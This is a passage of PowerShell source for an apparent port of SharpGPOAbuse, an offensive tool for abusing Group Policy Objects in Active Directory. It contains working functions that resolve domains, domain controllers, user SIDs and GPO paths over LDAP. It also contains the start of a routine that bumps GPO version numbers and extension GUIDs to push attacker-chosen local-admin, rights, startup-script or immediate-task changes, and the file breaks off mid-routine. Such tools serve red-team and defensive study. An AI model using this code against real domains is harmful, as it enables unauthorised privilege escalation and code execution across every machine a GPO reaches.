#require -version 2

<#

    PowerShell version of SharpGPOAbuse

    Author: Lancelot (@rootSySdk)

#>


function Get-Domain {

<#

    .SYNOPSIS

        Returns the domain object for the current (or specified) domain.
        Modified version of PowerView "Get-Domain" function written by Will Schroeder (@harmj0y)

    .DESCRIPTION

        Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
        domain or the domain specified with the Domain agrument.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential("Bobby", $pass)
        $adObject = Get-Domain -Credential $cred -Domain contoso.com

    .EXAMPLE

        $adObject = Get-Domain -Domain contoso.com

    .EXAMPLE

        $adObject = Get-Domain 

#>

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]

    param (
        
        [Parameter(ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    
    PROCESS {
        
        if ($PSBoundParameters['Credential']) {

            Write-Verbose 'Using alternate credentials for Get-Domain'

            if ($PSBoundParameters['Domain']) {

                $TargetDomain = $Domain
            } else {

                $TargetDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Forest.Name
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {

                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {

                Write-Host -ForegroundColor red -BackgroundColor black "The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                return
            }

        } elseif ($PSBoundParameters['Domain']) {
            
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)

            try {

                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {

                Write-Host -ForegroundColor red -BackgroundColor black "The specified domain 'Domain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                return
            }
        } else {

            try {

                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {

                Write-Host -ForegroundColor red -BackgroundColor black "Error retrieving the current domain: $_"
                return
            }
        }
    }
    
    END {
        
        return $DomainObject
    }
}

function Get-DomainController {

<#

    .SYNOPSIS

        Return current domain controller DNS hostname or specified domain controller DNS hostname.
        Inspired yet again by PowerView.

    .DESCRIPTION

        If function is called without argument it returns DNS name of the current Domain Controllers.
        You can choose to get specific domain controller, by FSMO role, or Identity (or both).
        Identity is checked using DirectoryEntry class and DirectorySearcher.

    .PARAMETER Identity

        Domain Controller Identity.

    .PARAMETER FsmoRole

        Domain Controller FsmoRole to filter.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential("Bobby", $pass)
        Get-DomainController -Identity DC -Domain Contoso.com -Credential $cred

    .EXAMPLE

        Get-DomainController -Identity DC -Domain Contoso.com

    .EXAMPLE

        Get-DomainController -Identity DC

    .EXAMPLE

        Get-DomainController

#>

    [CmdletBinding()]
    param (

        [Parameter(Mandatory=$false, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Identity,

        [Parameter(Mandatory=$false, ValueFromPipeline=$true)]
        [ValidateSet("PdcRole","RidRole","InfrastructureRole")]
        [Alias('Role')]
        [String]
        $FsmoRole,

        [Parameter(ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $arguments = @{}
        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
    }
    
    PROCESS {

        if ($PSBoundParameters['Identity']) {

            if (-not ($Identity.Contains("LDAP://"))) {

                $baseFilter = "(&(userAccountControl:1.2.840.113556.1.4.803:=8192)"
                $domainObj = Get-Domain @arguments

                if (($Identity -split "-").Count -eq 8) {

                    $filter = -join @($baseFilter, "(objectSid=$Identity))")
                } elseif ($Identity.Contains('DC=') -and $Identity.Contains(',')) {
                    
                    $filter = -join @($baseFilter, "(distinguishedName=$Identity))")
                } elseif ($Identity.Contains('$')) {
                
                    $filter = -join @($baseFilter, "(samAccountName=$Identity))")
                } elseif ($Identity.Contains($domainObj.Name)) {
                
                    $filter = -join @($baseFilter, "(dnshostname=$Identity))")
                } else {

                    $filter = -join @($baseFilter, "(name=$Identity))")
                }
	
                $PDC = ($domainObj.PdcRoleOwner).Name
                $SearchString = "LDAP://"
                $SearchString += $PDC + "/"
                $DistinguishedName = "DC=$($domainObj.Name.Replace('.',	',DC='))"
                $SearchString += $DistinguishedName
                if ($PSBoundParameters['Credential']) {

                    $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password)
                } else {

                    $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString)
                }	
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry
                $Searcher.SearchRoot = $objDomain
                $Searcher.filter="$filter"
                $result = $Searcher.FindOne()

                if ($result) {

                    if ($PSBoundParameters['FsmoRole']) {

                        if ($PSBoundParameters['Credential']) {$rootObj = New-Object System.DirectoryServices.DirectoryEntry "LDAP://RootDSE", $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password} else {$rootObj = New-Object System.DirectoryServices.DirectoryEntry "LDAP://RootDSE"}
                        $defaultNamingContext = $rootObj.defaultNamingContext
                        if ($FsmoRole -eq "PdcRole") {

                            if ($PSBoundParameters['Credential']) {

                                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$defaultNamingContext", $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                                $FSMOOwner = $objDomain.fSMORoleOwner
                                $pdcEmulator = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$FSMOOwner", $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                                $computer = New-Object System.DirectoryServices.DirectoryEntry ($pdcEmulator.Parent), $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                                if ($result.Properties.dnshostname -eq $computer.dnshostname) {

                                    $DomainController = $result.Properties.dnshostname
                                } else {

                                    Write-Host -ForegroundColor Red -BackgroundColor Black "[!] the given Domain Controller role isn't $FsmoRole"
                                    return
                                }
                            } else {

                                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$defaultNamingContext"
                                $FSMOOwner = $objDomain.fSMORoleOwner
                                $pdcEmulator = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$FSMOOwner"
                                $computer = New-Object System.DirectoryServices.DirectoryEntry ($pdcEmulator.Parent)
                                if ($result.Properties.dnshostname -eq $computer.dnshostname) {

                                    $DomainController = $result.Properties.dnshostname
                                } else {

                                    Write-Host -ForegroundColor Red -BackgroundColor Black "[!] the given Domain Controller role isn't $FsmoRole"
                                    return
                                }
                            }
                        } elseif ($FsmoRole -eq "RidRole") {

                            if ($PSBoundParameters['Credential']) {

                                $objRidManager = New-Object System.DirectoryServices.DirectoryEntry "LDAP://CN=RID Manager$,CN=System,$defaultNamingContext", $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                                $FSMOOwner = $objRidManager.fSMORoleOwner
                                $ridMaster = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$FSMOOwner", $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                                $computer = New-Object System.DirectoryServices.DirectoryEntry ($ridMaster.Parent), $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                                if ($result.Properties.dnshostname -eq $computer.dnshostname) {

                                    $DomainController = $result.Properties.dnshostname
                                } else {

                                    Write-Host -ForegroundColor Red -BackgroundColor Black "[!] the given Domain Controller role isn't $FsmoRole"
                                    return
                                }
                            } else {

                                $objRidManager = New-Object System.DirectoryServices.DirectoryEntry "LDAP://CN=RID Manager$,CN=System,$defaultNamingContext"
                                $FSMOOwner = $objRidManager.fSMORoleOwner
                                $ridMaster = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$FSMOOwner"
                                $computer = New-Object System.DirectoryServices.DirectoryEntry ($ridMaster.Parent)
                                if ($result.Properties.dnshostname -eq $computer.dnshostname) {

                                    $DomainController = $result.Properties.dnshostname
                                } else {

                                    Write-Host -ForegroundColor Red -BackgroundColor Black "[!] the given Domain Controller role isn't $FsmoRole"
                                    return
                                }
                            }
                        } else {
            
                            if ($PSBoundParameters['Credential']) {

                                $objInfrastructure = New-Object System.DirectoryServices.DirectoryEntry "LDAP://CN=Infrastructure,$defaultNamingContext", $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                                $FSMOOwner = $objInfrastructure.fSMORoleOwner
                                $InfrastructureMaster = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$FSMOOwner", $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                                $computer = New-Object System.DirectoryServices.DirectoryEntry ($InfrastructureMaster.Parent), $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                                if ($result.Properties.dnshostname -eq $computer.dnshostname) {

                                    $DomainController = $result.Properties.dnshostname
                                } else {

                                    Write-Host -ForegroundColor Red -BackgroundColor Black "[!] the given Domain Controller role isn't $FsmoRole"
                                    return
                                }
                            } else {

                                $objInfrastructure = New-Object System.DirectoryServices.DirectoryEntry "LDAP://CN=Infrastructure,$defaultNamingContext"
                                $FSMOOwner = $objInfrastructure.fSMORoleOwner
                                $InfrastructureMaster = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$FSMOOwner"
                                $computer = New-Object System.DirectoryServices.DirectoryEntry ($InfrastructureMaster.Parent)
                                if ($result.Properties.dnshostname -eq $computer.dnshostname) {

                                    $DomainController = $result.Properties.dnshostname
                                } else {

                                    Write-Host -ForegroundColor Red -BackgroundColor Black "[!] the given Domain Controller role isn't $FsmoRole"
                                    return
                                }
                            }
                        }
                    } else {

                        $DomainController = $result.Properties.dnshostname
                    }
                } else {

                    Write-Host -ForegroundColor Red -BackgroundColor Black "[-] Invalid Domain Controller given."
                    return
                }

            } else {

                if ($PSBoundParameters['Credential']) {

                    $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry $Identity, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
                } else {

                    $ADSIObject = New-Object System.DirectoryServices.DirectoryEntry $Identity
                }

                $DomainController = $ADSIObject.dNSHostName
            }
        } elseif ($PSBoundParameters['FsmoRole']) {

            if ($FsmoRole -eq "PdcRole") {

                $DomainController = ((Get-Domain @arguments).PdcRoleOwner).Name
            } elseif ($FsmoRole -eq "RidRole") {
                
                $DomainController = ((Get-Domain @arguments).RidRoleOwner).Name
            } else {

                $DomainController = ((Get-Domain @arguments).InfrastructureRoleOwner).Name
            }
        } else {

            $DomainController = ((Get-Domain @arguments).DomainControllers).Name
        }
    }
    
    END {
        
        return $DomainController
    }
}

function Get-UserSid {

<#

    .SYNOPSIS
    
        Get the SID of the specified User.

    .DESCRIPTION

        Return the SID of the given User by searching through LDAP.

    .PARAMETER Identity

        Set the Identity for which we are looking for the SID.
        Accept samaccountname/SID/disguishedname/LDAP Path.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        $userSid = Get-UserSid -Identity 'Administrator' -Domain contoso.com -Credential $cred
    
    .EXAMPLE

        $userSid = Get-UserSid -Identity 'Administrator' -Domain contoso.com

    .EXAMPLE

        $userSid = Get-UserSid -Identity 'Administrator'

#>

    [OutputType([System.String])]
    [CmdletBinding()]

    param (

        [Parameter(Mandatory=$true)]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    
    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
        $domainObj = Get-Domain	@arguments
        if ($PSBoundParameters['DomainController']) {$arguments['Identity'] = $DomainController; Write-Verbose "Using $DomainController as Domain Controller"}
        $arguments['FsmoRole'] = 'PdcRole'
        $PDC = Get-DomainController @arguments
    }

    PROCESS {

        if ((($Identity -split "-") | Measure-Object).Count -eq 8) {

            Write-Verbose "Verifying SID"

            try {

                if ($PSBoundParameters['Credential']) {
                    
                    $SearchString = "LDAP://"
                    $SearchString += $PDC + "/"
                    $DistinguishedName = "DC=$($domainObj.Name.Replace('.',	',DC='))"
                    $SearchString += $DistinguishedName
                    Write-Verbose "Search base: $SearchString"
                    $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password)
                    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
                    $Searcher.SearchRoot = $objDomain
                    $Searcher.filter="(ObjectSid=$Identity)" 
                    $result = $Searcher.FindOne()

                    if ($result) {

                        Write-Host -ForegroundColor Green "[+] valid SID given $Identity for user $($result.Properties.samaccountname)"
                        $IdentitySid = $Identity
                    } else {

                        Write-Host -ForegroundColor Red -BackgroundColor Black "[-] Invalid SID given"
                        return
                    }
                }
                if ($PSBoundParameters['Domain']) {

                    $objSID = New-Object System.Security.Principal.SecurityIdentifier($Domain, $Identity)
                } else {

                    $objSID = New-Object System.Security.Principal.SecurityIdentifier($Identity)
                }
                $objUser = $objSID.Translate([System.Security.Principal.NTAccount])
                $User = $objUser.Value
                Write-Host -ForegroundColor Green "[+] valid SID given $Identity for user $User"
            }
            catch {

                Write-Host -ForegroundColor Red -BackgroundColor Black "[-] Invalid SID given"
                return
            }
            $IdentitySid = $Identity

        } elseif ($Identity.Contains("LDAP://")) {

            Write-Verbose "Verifying LDAP Path"

            if ($PSBoundParameters['Credential']) {

                $LDAPUserPath = New-Object System.DirectoryServices.DirectoryEntry $Identity, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
            } else {

                $LDAPUserPath = New-Object System.DirectoryServices.DirectoryEntry $Identity
            }
            Write-Host -ForegroundColor Green "[+] Valid LDAP Path given for user $($LDAPUserPath.sAMAccountName)"
            foreach ($LDAPObject in $LDAPUserPath) {
            
                $objLDAP = $LDAPObject.Properties
                $sid = New-Object System.Security.Principal.SecurityIdentifier($objLDAP.objectsid[0], 0)
                $IdentitySid = $sid.value
            }
        } elseif (($Identity.Contains(",")) -and ($Identity.Contains("DC="))) {

            Write-Verbose "Verifying distinguishedName"
            
            $Identity = -join @("LDAP://", $Identity)
            if ($PSBoundParameters['Credential']) {

                $LDAPUserPath = New-Object System.DirectoryServices.DirectoryEntry $Identity, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
            } else {

                $LDAPUserPath = New-Object System.DirectoryServices.DirectoryEntry $Identity
            }
            Write-Host -ForegroundColor Green "[+] Valid distinguishedName given for user $($LDAPUserPath.sAMAccountName)"
            foreach ($LDAPObject in $LDAPUserPath) {
            
                $objLDAP = $LDAPObject.Properties
                $sid = New-Object System.Security.Principal.SecurityIdentifier($objLDAP.objectsid[0], 0)
                $IdentitySid = $sid.value
            }
        } else {

            try {

                $SearchString = "LDAP://"
                $SearchString += $PDC + "/"
                $DistinguishedName = "DC=$($domainObj.Name.Replace('.',	',DC='))"
                $SearchString += $DistinguishedName
                Write-Verbose "Search base: $SearchString"
                if ($PSBoundParameters['Credential']) {

                    $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password)
                } else {

                    $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString)
                }	
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry
                $Searcher.SearchRoot = $objDomain
                $Searcher.filter="(samAccountName=$Identity)" 
                $result = $Searcher.FindOne()
            }
            catch {
        
                Write-Host -ForegroundColor red -BackgroundColor black (-join @('[-] Could not find user "', $Identity, '" in the domain ', $domainObj.Forest.Name, "."))
                return
            }
            if ($result) {

                # https://social.technet.microsoft.com/Forums/windowsserver/en-US/4cb7a6f7-f926-4612-9340-fbbe60ab500f/ldap-attribute-for-sid?forum=winserverDS

                foreach ($resultObj in $result) {
            
                    $objItem = $resultObj.Properties
                    $sid = New-Object System.Security.Principal.SecurityIdentifier($objItem.objectsid[0], 0)
                    $IdentitySid = $sid.value
                }
            } else {

                Write-Host -ForegroundColor red -BackgroundColor black (-join @('[-] Could not find user "', $Identity, '" in the domain ', $domainObj.Forest.Name, "."))
                return
            }
        }
    }

    END {

        Write-Host -ForegroundColor green "[+] SID Value of $Identity = $IdentitySid"
        return $IdentitySid
    }
    
}

function Get-GPOPath {

<#

    .SYNOPSIS

        Get the GPOPath of the specified GPO.

    .DESCRIPTION

        Return the GPOPath of the given GPO by searching through LDAP.

    .PARAMETER GPOIdentity

        Set the GPO for which we are looking for the path.
        Accept displayname/LDAP Path/disguishedname/name.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.


    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        $gpoPath = Get-GPOPath -GPOIdentity 'UltraSecureGPO' -Domain contoso.com -Credential $cred

    .EXAMPLE

        $gpoPath = Get-GPOPath -GPOIdentity 'UltraSecureGPO' -Domain contoso.com
        
    .EXAMPLE

        $gpoPath = Get-GPOPath -GPOIdentity 'UltraSecureGPO'

#>

    [OutputType([System.Array])]
    [CmdletBinding()]

    param (

        [Parameter(Mandatory=$true)]
        [String]
        $GPOIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}
        if ($VerbosePreference -eq "Continue") {$arguments['Verbose'] = $true}
        $domainObj = Get-Domain	@arguments
        if ($PSBoundParameters['DomainController']) {$arguments['Identity'] = $DomainController; Write-Verbose "Using $DomainController as Domain Controller"}
        $arguments['FsmoRole'] = 'PdcRole'
        $PDC = Get-DomainController @arguments
    }
    
    PROCESS {

        if ((($GPOIdentity -split "-").Count -eq 5) -and (-not ($GPOIdentity.Contains(","))) -and (-not ($GPOIdentity.Contains("DC=")))) {

            if ($GPOIdentity[0] -ne "{") {

                $GPOIdentity = -join @('{',$GPOIdentity, '}')
            }

            try {

                $SearchString = "LDAP://"
                $SearchString += $PDC + "/"
                $DistinguishedName = "DC=$($domainObj.Name.Replace('.',	',DC='))"
                $SearchString += $DistinguishedName
                Write-Verbose "Search base: $SearchString"
                if ($PSBoundParameters['Credential']) {

                    $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password)
                } else {

                    $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString)
                }
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry
                $Searcher.SearchRoot = $objDomain
                $Searcher.filter="(name=$GPOIdentity)"
                $result = $Searcher.FindOne()
            } 
            catch {

                Write-Host -ForegroundColor red -BackgroundColor black "[!] Could not retrieve the GPO GUID."
                return
            }
        } elseif ($GPOIdentity.Contains("LDAP://")) {
            
            if ($PSBoundParameters['Credential']) {

                $result = New-Object System.DirectoryServices.DirectoryEntry  $GPOIdentity, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
            } else {

                $result = New-Object System.DirectoryServices.DirectoryEntry  $GPOIdentity
            }
        } elseif ($GPOIdentity.Contains(",") -and $GPOIdentity.Contains("DC=")) {

            $GPOIdentity = -join @("LDAP://", $GPOIdentity)
            if ($PSBoundParameters['Credential']) {

                $result = New-Object System.DirectoryServices.DirectoryEntry  $GPOIdentity, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password
            } else {

                $result = New-Object System.DirectoryServices.DirectoryEntry  $GPOIdentity
            }
        } else {
        
            try {

                $SearchString = "LDAP://"
                $SearchString += $PDC + "/"
                $DistinguishedName = "DC=$($domainObj.Name.Replace('.',	',DC='))"
                $SearchString += $DistinguishedName
                Write-Verbose "Search base: $SearchString"
                if ($PSBoundParameters['Credential']) {

                    $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password)
                } else {

                    $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString)
                }
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry
                $Searcher.SearchRoot = $objDomain
                $Searcher.filter="(displayName=$GPOIdentity)"
                $result = $Searcher.FindOne()
            } 
            catch {

                Write-Host -ForegroundColor red -BackgroundColor black "[!] Could not retrieve the GPO Path."
                return
            }   
        }

        if ($result.Path) {

            $GPOName = ($result.Properties).cn
            Write-Host -ForegroundColor green "[+] Name of $GPOIdentity is: $([System.String]$GPOName)"
            Write-Host -ForegroundColor green "[+] Path of $GPOIdentity is: $([System.String] ($result.Properties).gpcfilesyspath)"
        } else {

            Write-Host -ForegroundColor red -BackgroundColor black "[!] Could not retrieve the GPO name. The GPO DisplayName was invalid."
            return
        }
    }

    END {

        return @([System.String]$GPOName, [System.String]($result.Properties).gpcfilesyspath, [System.String]$result.Path)
    }
}

function Update-GPOVersion {

    <#
    
        .SYNOPSIS
    
            Update the GPO version.
    
    #>
    
    
    [CmdletBinding()]
    
    param (
    
        [ValidateSet("Computer","User")]
        [Parameter(Mandatory=$true)]
        [String]
        $ObjectType,
    
    
        [ValidateSet("AddLocalAdmin", "AddNewRights", "NewStartupScript", "NewImmediateTask")]
        [Parameter(Mandatory=$true)]
        [String]
        $Function,
    
        [Parameter(Mandatory=$true)]
        [String]
        $Path,
    
        [Parameter(Mandatory=$true)]
        [String]
        $LDAPPath,
            
        [Parameter(Mandatory=$true)]
        [String]
        $GPOIdentity,
    
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
        
    BEGIN {
        
        if ($PSBoundParameters['Credential']) {$GPOADSI = New-Object System.DirectoryServices.DirectoryEntry $LDAPPath, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password} else {$GPOADSI = New-Object System.DirectoryServices.DirectoryEntry $LDAPPath} 
    }
        
    PROCESS {
        

        if (-not (Test-Path -Path $Path)) {
    
            Write-Warning "[-] Could not find GPT.ini. The group policy might need to be updated manually using 'gpupdate /force'."
        }
    
        if ($ObjectType -eq "Computer") {
    
            $properties = @('machine', 'versionNumber', 'gPCMachineExtensionNames')
        } else {
    
            $properties = @('user','versionNumber', 'gPCUserExtensionNames')
        }
    
        if ($properties[0] -eq 'user') {
    
            $GPOADSI.versionNumber = [System.Int32]([System.String]$GPOADSI.versionNumber) + 65536
        } else {
    
            $GPOADSI.versionNumber = [System.Int32]([System.String]$GPOADSI.versionNumber) + 1
        }
        $new_ver = [System.String] $GPOADSI.versionNumber
        Write-Verbose "Updating versionNumber attribute to value $new_ver."
        Write-Verbose "Changing $($properties[2])."
        if ($Function -eq "AddLocalAdmin" -or $Function -eq "AddNewRights" -or $Function -eq "NewStartupScript") {
    
            if ($Function -eq "AddLocalAdmin" -or $Function -eq "AddNewRights") {
    
                $val1 = "827D319E-6EAC-11D2-A4EA-00C04F79F83A"
                $val2 = "803E14A0-B4FB-11D0-A0D0-00A0C90F574B"
            } else {
    
                $val1 = "42B5FAAE-6536-11D2-AE5A-0000F87571E3"
                $val2 = "40B6664F-4972-11D1-A7CA-0000F87571E3"
            }
        
            $entryToUpdate = $GPOADSI."$($properties[2])"

            try {
                
                if (-not ([System.String]$entryToUpdate -eq "")) {

                    if (-not (([System.String]$entryToUpdate).Contains($val2))) {

                        if (([System.String]$entryToUpdate).Contains($val1)) {

                            $test = ([System.String]$entryToUpdate).Split("[")
                            $new_values = New-Object System.Collections.Generic.List[System.Object]
                            $addition = $val2

                            foreach ($i in $test) {

                                $new_values.Add($i.Replace("{","").Replace("}"," ").Replace("]", ""))
                            }

                            for ($i = 0; $i -lt $new_values.Count; $i++) {

                                if ($new_values[$i].Contains($val1)) {

                                    $toSort = New-Object System.Collections.Generic.List[System.Object]
                                    $test2 = $new_values[$i].Split()
                                    foreach ($string in $test2) {
            
                                        if (-not ($string -eq "")) {

                                            $toSort.Add($string)

                                        }
                                    }
                                    $toSort.Add($addition)
                                    $toSort = $toSort | Sort-Object
                                    $new_values[$i] = $test2[0]

                                    foreach ($val in $toSort) {

                                        $new_values[$i] += " " + $val
                                    }
                                }
                            }
                            $new_values2 = New-Object System.Collections.Generic.List[System.Object]

                            for ($i = 0; $i -lt $new_values.Count; $i++) {

                                if (-not ($new_values[$i] -eq "")) {

                                    $value1 = $new_values[$i].Split()
                                    $new_val = ""
                                    foreach ($string in $value1) {

                                        if (-not ($new_val.Contains($string))) {

                                            $new_val += "{" + $string + "}"
                                        }
                                    }

                                $new_val = "[" + $new_val + "]"
                                $new_values2.Add($new_val)
                                }
                            }

                            $entryToUpdate = (-join $new_values2)
                        } else {

                            $test = ([System.String]$entryToUpdate).Split("[")
                            $new_values = New-Object System.Collections.Generic.List[System.Object]

                            $null = foreach ($i in $test) {

                                $new_values.Add($i.Replace("{","").Replace("}"," ").Replace("]", ""))
                            }

                            $addition = $val1 + " " + $val2
                            $new_values.Add($addition)
                            $new_values = $new_values | Sort-Object
                            $new_values2 = New-Object System.Collections.Generic.List[System.Object]

                            for ($i = 0; $i -lt $new_values.Count; $i++) {

                                if (-not ($new_values[$i] -eq "")) {
                            
                                    $value1 = ($new_values[$i]).Split()
                            
                                    $new_val = ""
                            
                                    foreach ($string in $value1) {
                                        
                                        if (-not ($string -eq "")) {
                            
                                            $new_val += "{" + $string + "}"
                                        }
                                    }
                                    $new_val = "[" + $new_val + "]"
                                    $new_values2.Add($new_val)
                                }
                            }

                            $GPOADSI."$($properties[2])" = (-join $new_values2)
                        }
                    } else {

                        Write-Verbose "$($properties[2]) was already set"
                    }
                } else {

                    $GPOADSI."$($properties[2])" = -join @([System.String]$entryToUpdate, "[{", $val1, "}{", $val2, "}]")
                }
            }
            catch {
                    
                $GPOADSI."$($properties[2])" = -join @([System.String]$entryToUpdate, "[{", $val1, "}{", $val2, "}]")
            }
        }
        if ($Function -eq "NewImmediateTask") {
    
            $val1 = "00000000-0000-0000-0000-000000000000"
            $val2 = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"
            $val3 = "AADCED64-746C-4633-A97C-D61349046527"
    
            try {
            
                if (-not ([System.String]$entryToUpdate -eq "")) {

                    if ($entryToUpdate.Contains($val2)) {

                        $new_values = New-Object System.Collections.Generic.List[System.object]
                        $test = $entryToUpdate.Split("[")
                        foreach ($i in $test) {
                    
                            $new_values.Add($i.Replace("{","").Replace("}"," ").Replace("]", ""))
                        }
                    
                        if (-not ($entryToUpdate.Contains($val1))) {
                    
                            $new_values.Add($val1 + " " + $val2)
                        } elseif ($entryToUpdate.Contains($val1)) {
                    
                            for ($k = 0; $k -lt $new_values.Count; $k++) {
                                
                                if ($new_values[$k].Contains($val1)) {
                    
                                    $toSort = New-Object System.Collections.Generic.List[System.Object]
                                    $test2 = $new_values[$k].Split()
                                    foreach ($string in $test2) {
                    
                                        $toSort.Add($string)
                                    }
                                    $toSort.Add($val2)
                                    $toSort = $toSort | Sort-Object
                                    $new_values[$k] = $test2[0]
                                    foreach ($val in $toSort) {
                    
                                        $new_values[$k] += " " + $val; 
                                    }
                                }
                            }
                        }
                        if (-not $entryToUpdate.Contains($val3)) {
                    
                            $new_values.Add($val3 + " " + $val2)
                        } elseif ($entryToUpdate.Contains($val3)) {
                    
                            for ($k = 0; $k -lt $new_values.Count; $k++) {
                    
                                if ($new_values[$k].Contains($val3)) {
                    
                                    $toSort = New-Object System.Collections.Generic.List[System.Object]
                                    $test2 = $new_values[$k].Split()
                                    foreach ($string in $test2) {
                    
                                        $toSort.Add($string)
                                    }
                                    $toSort.Add($val2)
                                    $toSort = $toSort | Sort-Object
